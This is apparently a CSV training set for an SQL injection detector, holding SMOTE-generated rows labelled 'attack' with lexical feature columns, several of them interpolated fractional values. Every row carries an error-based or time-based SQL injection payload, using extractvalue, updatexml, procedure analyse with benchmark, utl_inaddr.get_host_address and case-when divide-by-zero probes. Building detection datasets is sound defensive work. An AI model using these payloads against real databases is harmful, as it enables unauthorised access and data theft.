id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000087,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000058,1.1712722242530431,145.2975597134904,30.702440286509603,3.775772572276596,49.6756100716274,23.324389928372597,55.297559713490394,17.0,0.3419861986035954,0.16051371416457277,0.3804795596008885,0.11702052763094328,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.324389928372598,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,0.6756100716274008,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000088,attack,error,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000259,1.085881980343944,139.4038982082392,25.807796416478435,3.6491276812025317,36.40389820823922,35.0,51.0,17.0,0.2611306020271654,0.2510721255247496,0.3658479543360637,0.12194931811202124,0.0,1.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,5.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.4038982082392179,0.596101791760782,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000089,attack,error,"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000256,0.5501650172762863,173.25827452715777,32.40728431589472,3.8087561142893014,55.22185294768416,32.0,65.62913726357888,20.40728431589472,0.3186517449917706,0.18493786259111167,0.37863452767458294,0.1177758647425347,0.2036421579473605,0.0,2.0,0.0,0.0,1.0,0.0,13.20364215794736,2.7755575615628914e-17,0.0,4.0,3.0,0.20364215794736074,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000090,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000126,0.32989202309752397,159.1642499387295,32.0,3.6566954408023524,50.0,23.0,66.53139995098361,19.632849987745903,0.3142135492540024,0.1445382326568411,0.4179163241071331,0.12333189398202342,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.632849987745903,2.7755575615628914e-17,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000091,attack,error,"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",nearest_attack_euclidean,R000300,1.2882646136465516,179.3966813712292,34.399051820351204,3.8048981307192085,57.5985777305268,32.0,68.79810364070241,21.0,0.3209083609253582,0.17864094187199828,0.38321757909914467,0.11723311810349887,0.0,0.4002370449121995,2.0,0.0,0.0,1.0,0.0,13.599762955087801,2.7755575615628914e-17,0.0,4.0,3.0,0.0,0.4002370449121997,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000092,attack,error,"1""  )   as pkkx where 6716  =  6716 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000292,0.3210182394296944,176.28167615672777,31.0,3.846943767836634,45.54928978145475,46.267613624727,62.46477275054601,22.0,0.2583500874317687,0.262656000155762,0.3541649289100521,0.12482898350241725,0.0,1.0,2.0,0.0,0.0,2.0,0.0,11.18309659381825,2.7755575615628914e-17,0.0,5.816903406181749,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000093,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000093,0.0,133.0,29.0,3.7442941285734888,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000094,attack,error,select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000238,0.00970995538504258,133.0,29.0,3.739450165087591,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000095,attack,error,"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000192,0.2674164292149661,152.48593616952132,34.0,3.8300665710607293,50.0,23.0,59.238280141267765,20.247656028253555,0.3281072275433281,0.15092932466993092,0.38820119463288494,0.13276225315385612,0.0,1.0,0.0,0.0,0.0,0.0,0.0,13.247656028253553,1.0,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000096,attack,error,"1"" or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and ""deeu"" like ""deeu",nearest_attack_euclidean,R000123,0.14714076924566633,191.9240073302472,30.924007330247207,3.6647456642385787,57.69602932098883,32.0,77.15198533950559,25.075992669752793,0.30061205291436294,0.16673297789681743,0.4019969628260263,0.13065800636279332,0.0,3.999999999999999,0.0,0.0,1.0,1.0759926697527926,0.0,14.0,2.7755575615628914e-17,0.0,4.0,2.0759926697527926,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000097,attack,error,"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000099,0.5548271782500865,149.25294052574117,32.25294052574115,3.792101250674267,50.0,23.0,58.0,18.252940525741156,0.33500460732496384,0.15410211936948337,0.38860534449695805,0.1222879288085947,0.252940525741155,0.0,0.0,0.0,0.0,0.0,0.0,13.0,2.7755575615628914e-17,0.0,4.0,0.0,0.2529405257411549,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000098,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,0.21763061612056336,109.88294314844815,36.558528425775926,4.242718059484449,58.88294314844815,1.0,35.0,15.0,0.5358318952451323,0.009101335387350334,0.3185467385572622,0.1365200308102552,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.7755575615628914e-17,4.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000099,attack,error,"1,updatexml  (  2917,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  2917  =  2917,1   )    )     )  ,0x717a767a71  )  ,8295  )  ",nearest_attack_euclidean,R000152,0.8096381368005451,136.77558546825662,25.556103632935844,3.679420332100701,32.33168910119247,39.0,47.88779273412831,17.556103632935844,0.2362768387500681,0.2851986233273643,0.3500879031227957,0.12843663479977188,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,2.7755575615628914e-17,0.0,6.556103632935843,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.44389636706415686,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4438963670641565
SMOTE_000100,attack,error,"1' in boolean mode  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  #",nearest_attack_euclidean,R000068,0.9732865259943858,161.3801795757728,29.0,3.8306845664840883,46.38017957577279,39.0,56.0,20.0,0.2873905625034074,0.24166754836840967,0.347009813041819,0.12393207608636393,1.0,0.0,0.0,0.0,0.0,1.0,0.0,11.0,2.7755575615628914e-17,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.38017957577279626,0.6198204242272037,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000101,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'knhm'  =  'knhm",nearest_attack_euclidean,R000276,1.1924836575846214,182.20902152573558,30.970139782037773,3.6832931011296632,60.0,24.0,74.17916130777336,24.029860217962227,0.32977955278778126,0.13191182111511252,0.40644413499955606,0.13186449109755013,4.0,0.0,0.0,0.0,0.0,1.0,0.0,15.029860217962225,2.7755575615628914e-17,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000102,attack,error,"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000168,0.26234411980022404,167.11792841929216,30.0,3.8144256534140526,39.58844631446912,47.0,59.52948210482304,21.0,0.23666534811540735,0.2813612669221674,0.3562587763376271,0.1257146086247982,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,6.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000103,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000005,0.4875002878089164,109.1497717828345,36.42511410858275,4.274909533159845,58.1497717828345,1.0,35.0,15.0,0.5326255258700859,0.00916420537509638,0.3207471881283724,0.1374630806264453,3.0,0.0,0.0,0.0,0.0,2.0,0.0,4.0,2.7755575615628914e-17,4.287442945708625,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000104,attack,error,"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000197,0.13529409720199123,163.26473819356602,31.097287553351233,3.895289020799778,39.5837253201074,47.0,55.5837253201074,21.097287553351233,0.24233646251528476,0.28802671269496993,0.34038810939016817,0.12924871539957716,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.097287553351233,2.7755575615628914e-17,0.0,6.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000105,attack,error,select   (  case when   (  5322  =  6200  )   then 5322 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000122,0.0062541236171392844,133.0,28.0,3.7181734147267314,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000106,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000097,0.005490465035845281,133.0,30.0,3.769588432218938,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000107,attack,error,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000076,0.6742112214204661,186.20414985801386,27.0,3.40716287006868,38.60092219066975,35.79815561866051,83.00461095334873,28.800461095334875,0.20729857147816982,0.19249696931171076,0.4455162879263753,0.15468817128374404,4.0,0.0,0.0,0.0,0.0,2.0,0.0,15.600922190669746,2.0,0.0,5.199538904665127,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.1995389046651275,0.8004610953348725,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000108,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000146,0.3906731031778446,186.7921800566014,27.22078199433986,3.4578127631749283,37.66234598301958,38.116872022640564,81.67530803396085,29.337654016980423,0.20188208237109298,0.20396068073871926,0.4371695271709581,0.15698770971922962,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,15.558436011320284,2.0,0.0,5.779218005660141,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000109,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000248,1.200410129746254,164.5309167101347,27.0,3.6676769208721223,36.53091671013471,39.0,63.0,26.0,0.22202355280477615,0.23703969875479475,0.38291028260389925,0.15802646583652985,0.0,3.999999999999999,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.5309167101347114,0.4690832898652886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000110,attack,error,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,nearest_attack_euclidean,R000091,0.648860881003636,158.42154978254192,30.566162336906434,3.783943890418781,50.264649347625735,25.590738098009744,59.56616233690643,23.0,0.31706872215785403,0.16176953389338783,0.3759678159714185,0.14519392797733965,0.0,3.999999999999999,0.0,0.0,0.0,1.144612554364522,0.0,11.710774891270956,2.0,0.0,4.144612554364522,1.144612554364522,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.14461255436452203,0.0,0.0,0.0,1.144612554364522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.855387445635478,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.144612554364522
SMOTE_000111,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",nearest_attack_euclidean,R000285,0.0628546260411536,166.0239946523545,26.0239946523545,3.5701982431751733,39.0239946523545,43.0,65.0,19.0,0.2350496833146606,0.2589989261218078,0.3915100046027328,0.11444138596079881,0.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.7755575615628914e-17,0.0,5.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.023994652354498,0.976005347645502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000112,attack,error,"1  )   where 9059  =  9059 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000215,0.19502707870145614,166.0,29.17354712341323,3.7795432084722376,41.479358629760306,43.69418849365292,60.65290575317354,20.17354712341323,0.24987565439614642,0.2632180029738128,0.3653789503203225,0.12152739230971825,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,2.7755575615628914e-17,0.0,5.173547123413231,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000113,attack,error,select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000159,0.004261936351243196,133.0,28.0,3.729951242443873,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,2.7755575615628914e-17,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000114,attack,error,"1' where 4102  =  4102 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000269,0.1614874628420756,161.91041833312036,29.0,3.776393741451256,41.0,43.0,57.7283346664963,20.182083666624074,0.2532617244758686,0.26561595493810614,0.356483126405674,0.12463919418035128,1.0,0.0,2.0,0.0,0.0,2.0,0.0,10.182083666624075,2.7755575615628914e-17,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000115,attack,error,"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh",nearest_attack_euclidean,R000105,1.0536261922258638,172.80900843087193,30.0,3.795163342862777,54.15735581565849,32.033635753469575,64.34834738478655,22.26966947695731,0.31325570637501393,0.1855970117779485,0.37229063850625765,0.1288566433407799,0.0,3.999999999999999,0.0,0.0,0.0,1.0,0.0,12.539338953914623,2.7755575615628914e-17,0.0,4.730330523042689,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.7303305230426886,0.0,0.0,0.0,1.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.26966947695731136,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7303305230426886
